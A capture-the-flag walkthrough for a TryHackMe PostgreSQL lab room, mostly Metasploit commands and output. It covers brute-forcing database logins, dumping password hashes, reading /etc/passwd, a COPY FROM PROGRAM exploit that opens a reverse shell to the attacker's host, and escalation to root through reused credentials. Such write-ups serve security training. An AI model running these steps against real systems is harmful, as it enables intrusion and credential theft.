# TryHackMe Poster Room Walkthrough

## 1 - Identify the RDBMS

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:ed:48:af:29:9e:30:c1:b6:1d:ff:b0:24:cc:6d:cb (RSA)
|   256 eb:3a:a3:4e:6f:10:00:ab:ef:fc:c5:2b:0e:db:40:57 (ECDSA)
|_  256 3e:41:42:35:38:05:d3:92:eb:49:39:c6:e3:ee:78:de (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Poster CMS
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2020-07-29T00:54:25
|_Not valid after:  2030-07-27T00:54:25
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Answer: postgresql

## 2 - Determine the Port
Answer: 5432

## 3 - Explore Metasploit
Metasploit provides useful modules for enumerating RDBMS services. Let's search for PostgreSQL-related modules.

kali@kali:/data/Poster$ msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search postgres

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   auxiliary/admin/http/manageengine_pmp_privesc               2014-11-08       normal     Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
   1   auxiliary/admin/http/rails_devise_pass_reset                2013-01-28       normal     No     Ruby on Rails Devise Authentication Password Reset
   2   auxiliary/admin/postgres/postgres_readfile                                   normal     No     PostgreSQL Server Generic Query
   3   auxiliary/admin/postgres/postgres_sql                                        normal     No     PostgreSQL Server Generic Query
   4   auxiliary/analyze/crack_databases                                            normal     No     Password Cracker: Databases
   5   auxiliary/scanner/postgres/postgres_dbname_flag_injection                    normal     No     PostgreSQL Database Name Command Line Flag Injection
   6   auxiliary/scanner/postgres/postgres_hashdump                                 normal     No     Postgres Password Hashdump
   7   auxiliary/scanner/postgres/postgres_login                                    normal     No     PostgreSQL Login Utility
   8   auxiliary/scanner/postgres/postgres_schemadump                               normal     No     Postgres Schema Dump
   9   auxiliary/scanner/postgres/postgres_version                                  normal     No     PostgreSQL Version Probe
   10  auxiliary/server/capture/postgresql                                          normal     No     Authentication Capture: PostgreSQL
   11  exploit/linux/postgres/postgres_payload                     2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   12  exploit/multi/http/manage_engine_dc_pmp_sqli                2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   13  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   14  exploit/multi/postgres/postgres_createlang                  2016-01-01       good       Yes    PostgreSQL CREATE LANGUAGE Execution
   15  exploit/windows/misc/manageengine_eventlog_analyzer_rce     2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   16  exploit/windows/postgres/postgres_payload                   2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   17  post/linux/gather/enum_users_history                                         normal     No     Linux Gather User History

Interact with a module by name or index, for example use 17 or use post/linux/gather/enum_users_history

## 4 - Find User Credentials Module
We need to find an auxiliary module that allows us to enumerate user credentials. The module we're looking for is located at auxiliary/scanner/postgres/postgres_login.

msf5 > use auxiliary/scanner/postgres/postgres_login
msf5 auxiliary(scanner/postgres/postgres_login) > show options

Module options (auxiliary/scanner/postgres/postgres_login):

   Name              Current Setting                                                               Required  Description
   ----              ---------------                                                               --------  -----------
   BLANK_PASSWORDS   false                                                                         no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                             yes       How fast to bruteforce, from 0 to 5
   DATABASE          template1                                                                     yes       The database to authenticate against
   DB_ALL_CREDS      false                                                                         no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                         no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                         no        Add all users in the current database to the list
   PASSWORD                                                                                        no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RETURN_ROWSET     true                                                                          no        Set to true to see query result sets
   RHOSTS                                                                                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             5432                                                                          yes       The target port
   STOP_ON_SUCCESS   false                                                                         yes       Stop guessing when a credential works for a host
   THREADS           1                                                                             yes       The number of concurrent threads (max one per host)
   USERNAME                                                                                        no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/postgres_default_userpass.txt  no        File containing (space-separated) users and passwords, one pair per line
   USER_AS_PASS      false                                                                         no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt      no        File containing users, one per line
   VERBOSE           true                                                                          yes       Whether to print output for all attempts
Answer: auxiliary/scanner/postgres/postgres_login

## 5 - Discover User Credentials
After setting up the module, we can run it to find user credentials. example: user:password

msf5 auxiliary(scanner/postgres/postgres_login) > set rhost 10.10.208.102
rhost => 10.10.208.102
msf5 auxiliary(scanner/postgres/postgres_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 10.10.208.102:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
[+] 10.10.208.102:5432 - Login Successful: postgres:password@template1
[-] 10.10.208.102:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
[-] 10.10.208.102:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer: postgres:password

## 6 - Execute Commands
Now, let's find a module that allows us to execute commands with proper user credentials. The module we need is auxiliary/admin/postgres/postgres_sql.

Answer: auxiliary/admin/postgres/postgres_sql

## 7 - Identify the RDBMS Version
Using the module we found, we can determine the RDBMS version. The server is running PostgreSQL 9.5.21.

msf5 auxiliary(admin/postgres/postgres_sql) > show options

Module options (auxiliary/admin/postgres/postgres_sql):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   DATABASE       template1         yes       The database to authenticate against
   PASSWORD       postgres          no        The password for the specified username. Leave blank for a random password.
   RETURN_ROWSET  true              no        Set to true to see query result sets
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          5432              yes       The target port
   SQL            select version()  no        The SQL query to execute
   USERNAME       postgres          yes       The username to authenticate as
   VERBOSE        false             no        Enable verbose output

msf5 auxiliary(admin/postgres/postgres_sql) > set rhost 10.10.208.102
rhost => 10.10.208.102
msf5 auxiliary(admin/postgres/postgres_sql) > set password password
password => password
msf5 auxiliary(admin/postgres/postgres_sql) > run
[*] Running module against 10.10.208.102

Query Text: 'select version()'
==============================

    version
    -------
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit

[*] Auxiliary module execution completed
Answer: 9.5.21

## 8 - Dump User Hashes
To dump user hashes, we'll use the auxiliary/scanner/postgres/postgres_hashdump module.

Answer: auxiliary/scanner/postgres/postgres_hashdump

## 9 - Number of User Hashes
Running the module reveals that we have dumped 6 user hashes.

msf5 > use auxiliary/scanner/postgres/postgres_hashdump
msf5 auxiliary(scanner/postgres/postgres_hashdump) > show options

Module options (auxiliary/scanner/postgres/postgres_hashdump):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  postgres         yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5432             yes       The target port
   THREADS   1                yes       The number of concurrent threads (max one per host)
   USERNAME  postgres         yes       The username to authenticate as

msf5 auxiliary(scanner/postgres/postgres_hashdump) > set rhosts 10.10.208.102
rhosts => 10.10.208.102
msf5 auxiliary(scanner/postgres/postgres_hashdump) > set password password
password => password
msf5 auxiliary(scanner/postgres/postgres_hashdump) > run

[+] Query appears to have run successfully
[+] Postgres Server Hashes
======================

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
Answer: 6

## 10 - View Files
We can use the auxiliary/admin/postgres/postgres_readfile module to view files on the server with proper credentials.

msf5 auxiliary(scanner/postgres/postgres_hashdump) > use auxiliary/admin/postgres/postgres_readfile
msf5 auxiliary(admin/postgres/postgres_readfile) > show options 

Module options (auxiliary/admin/postgres/postgres_readfile):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   DATABASE  template1        yes       The database to authenticate against
   PASSWORD  postgres         no        The password for the specified username. Leave blank for a random password.
   RFILE     /etc/passwd      yes       The remote file
   RHOSTS                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT     5432             yes       The target port
   USERNAME  postgres         yes       The username to authenticate as
   VERBOSE   false            no        Enable verbose output

msf5 auxiliary(admin/postgres/postgres_readfile) > set rhost 10.10.208.102
rhost => 10.10.208.102
msf5 auxiliary(admin/postgres/postgres_readfile) > set password password
password => password
msf5 auxiliary(admin/postgres/postgres_readfile) > run
[*] Running module against 10.10.208.102

Query Text: 'CREATE TEMP TABLE yHVnDlj (INPUT TEXT);
      COPY yHVnDlj FROM '/etc/passwd';
      SELECT * FROM yHVnDlj'
========================================================================================================================

    input
    -----
    #/home/dark/credentials.txt
    _apt:x:105:65534::/nonexistent:/bin/false
    alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    dark:x:1001:1001::/home/dark:
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    messagebus:x:106:110::/var/run/dbus:/bin/false
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    root:x:0:0:root:/root:/bin/bash
    sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    syslog:x:104:108::/home/syslog:/bin/false
    systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
    systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
    systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
    systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    uuidd:x:107:111::/run/uuidd:/bin/false
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

#/home/dark/credentials.txt
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
alison:x:1000:1000:Poster,,,:/home/alison:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:109:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
dark:x:1001:1001::/home/dark:
[+] 10.10.208.102:5432 Postgres - /etc/passwd saved in /home/kali/.msf4/loot/20200915161026_default_10.10.208.102_postgres.file_802478.txt
[*] Auxiliary module execution completed
Answer: auxiliary/admin/postgres/postgres_readfile

## 11 - Execute Arbitrary Commands
To execute arbitrary commands, we'll use the exploit/multi/postgres/postgres_copy_from_program_cmd_exec module.

msf5 auxiliary(admin/postgres/postgres_readfile) > use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > show options 

Module options (exploit/multi/postgres/postgres_copy_from_program_cmd_exec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   DATABASE           template1        yes       The database to authenticate against
   DUMP_TABLE_OUTPUT  false            no        select payload command output from table (For Debugging)
   PASSWORD           postgres         no        The password for the specified username. Leave blank for a random password.
   RHOSTS                              yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT              5432             yes       The target port (TCP)
   TABLENAME          iJ1GkjBpB7OS     yes       A table name that does not exist (To avoid deletion)
   USERNAME           postgres         yes       The username to authenticate as


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set rhost 10.10.208.102
rhost => 10.10.208.102
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set password password
password => password
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > set lhost 10.8.50.72
lhost => 10.8.50.72
msf5 exploit(multi/postgres/postgres_copy_from_program_cmd_exec) > run

[*] Started reverse TCP handler on 10.8.50.72:4444 
[*] 10.10.208.102:5432 - 10.10.208.102:5432 - PostgreSQL 9.5.21 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit
[*] 10.10.208.102:5432 - Exploiting...
[+] 10.10.208.102:5432 - 10.10.208.102:5432 - iJ1GkjBpB7OS dropped successfully
[+] 10.10.208.102:5432 - 10.10.208.102:5432 - iJ1GkjBpB7OS created successfully
[+] 10.10.208.102:5432 - 10.10.208.102:5432 - iJ1GkjBpB7OS copied successfully(valid syntax/command)
[+] 10.10.208.102:5432 - 10.10.208.102:5432 - iJ1GkjBpB7OS dropped successfully(Cleaned)
[*] 10.10.208.102:5432 - Exploit Succeeded
[*] Command shell session 1 opened (10.8.50.72:4444 -> 10.10.208.102:58708) at 2020-09-15 16:13:08 +0200

python3 -c "import pty;pty.spawn('/bin/bash')"
postgres@ubuntu:/var/lib/postgresql/9.5/main$ id
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
Answer: exploit/multi/postgres/postgres_copy_from_program_cmd_exec

## 12 - Locate User Flag

The user flag is located under alison’s home directory, but is only readable by alison.

postgres@ubuntu:/var/lib/postgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null
<stgresql/9.5/main$ find / -type f -name user.txt 2>/dev/null                
/home/alison/user.txt
postgres@ubuntu:/var/lib/postgresql/9.5/main$ cat /home/alison/user.txt
cat /home/alison/user.txt
cat: /home/alison/user.txt: Permission denied
Enumerating the files owned by alison reveals a config.php file that contains the database credentials. As the username is alison, we could assume that she used the same password for the database and her account.

dark@ubuntu:/home/alison$ cd /var/www/html/
dark@ubuntu:/var/www/html$ ll
total 16
drwxr-xr-x 3 root   root   4096 Jul 28 20:22 ./
drwxr-xr-x 3 root   root   4096 Jul 28 20:12 ../
-rwxrwxrwx 1 alison alison  123 Jul 28 21:07 config.php*
drwxr-xr-x 4 alison alison 4096 Jul 28 20:22 poster/
dark@ubuntu:/var/www/html$ cat config.php 
<?php 
    
    $dbhost = "127.0.0.1";
    $dbuname = "alison";
    $dbpass = "p4ssw0rdS3cur3!#";
    $dbname = "mysudopassword";
?>
It is confirmed that the alison’s password is the same as the one to connect to the database. We can now read the user flag:

dark@ubuntu:/var/www/html$ su alison
Password: 
alison@ubuntu:/var/www/html$ cat /home/alison/user.txt
THM{postgresql_fa1l_conf1gurat1on}

## 13 - Escalate Privileges

Alison has sudo access. Use sudo to read the root flag.

alison@ubuntu:/var/www/html$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
alison@ubuntu:/var/www/html$ sudo -s
root@ubuntu:/var/www/html# cat /root/root.txt 

Root Flag: THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
